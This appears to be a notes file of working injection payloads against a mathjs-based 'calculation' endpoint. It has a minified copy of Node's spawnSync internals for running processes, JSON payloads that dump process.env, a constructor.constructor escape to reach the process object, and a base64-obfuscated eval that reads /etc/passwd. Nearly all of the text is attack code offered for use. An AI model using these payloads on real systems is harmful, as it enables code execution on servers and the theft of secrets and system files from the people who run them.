Help: https://jwlss.pw/mathjs/



```js
/ Source: https://github.com/nodejs/node/blob/master/lib/child_process.js

// Defines spawn_sync and normalizeSpawnArguments (without error handling). These are internal variables.
spawn_sync = process.binding('spawn_sync'); normalizeSpawnArguments = function(c,b,a){if(Array.isArray(b)?b=b.slice(0):(a=b,b=[]),a===undefined&&(a={}),a=Object.assign({},a),a.shell){const g=[c].concat(b).join(' ');typeof a.shell==='string'?c=a.shell:c='/bin/sh',b=['-c',g];}typeof a.argv0==='string'?b.unshift(a.argv0):b.unshift(c);var d=a.env||process.env;var e=[];for(var f in d)e.push(f+'='+d[f]);return{file:c,args:b,options:a,envPairs:e};}

// Defines spawnSync, the function that will do the actual spawning
spawnSync = function(){var d=normalizeSpawnArguments.apply(null,arguments);var a=d.options;var c;if(a.file=d.file,a.args=d.args,a.envPairs=d.envPairs,a.stdio=[{type:'pipe',readable:!0,writable:!1},{type:'pipe',readable:!1,writable:!0},{type:'pipe',readable:!1,writable:!0}],a.input){var g=a.stdio[0]=util._extend({},a.stdio[0]);g.input=a.input;}for(c=0;c<a.stdio.length;c++){var e=a.stdio[c]&&a.stdio[c].input;if(e!=null){var f=a.stdio[c]=util._extend({},a.stdio[c]);isUint8Array(e)?f.input=e:f.input=Buffer.from(e,a.encoding);}}console.log(a);var b=spawn_sync.spawn(a);if(b.output&&a.encoding&&a.encoding!=='buffer')for(c=0;c<b.output.length;c++){if(!b.output[c])continue;b.output[c]=b.output[c].toString(a.encoding);}return b.stdout=b.output&&b.output[1],b.stderr=b.output&&b.output[2],b.error&&(b.error= b.error + 'spawnSync '+d.file,b.error.path=d.file,b.error.spawnargs=d.args.slice(1)),b;}
```


Working payloads. (need to make the return data a string) 

Base64
```json
{"calculation":"Buffer.from('SGVsbG8gV29ybGQ=', 'base64').toString()"}
```

Process.env
```json
{"calculation":"JSON.stringify(process.env)"}
```

Process.env
```json
{"calculation":"JSON.stringify(this.constructor.constructor('return process')().env)"}
```

kills app (process.exit() also kills app)
```json
{"calculation":"eval(Buffer.from('KCgpID0+IHsNCiAgICBidWZmZXIgPSBCdWZmZXIuYWxsb2NVbnNhZmUoODE5Mik7IA0KICAgIHByb2Nlc3MuYmluZGluZygnZnMnKS5yZWFkKHByb2Nlc3MuYmluZGluZygnZnMnKS5vcGVuKCcvZXRjL3Bhc3N3ZCcsIDAsIDA2MDApLCBidWZmZXIsIDAsIDQwOTYpOyANCiAgICByZXR1cm4gYnVmZmVyOw0KfSkoKQ==', 'base64').toString())"}
```

```json

```
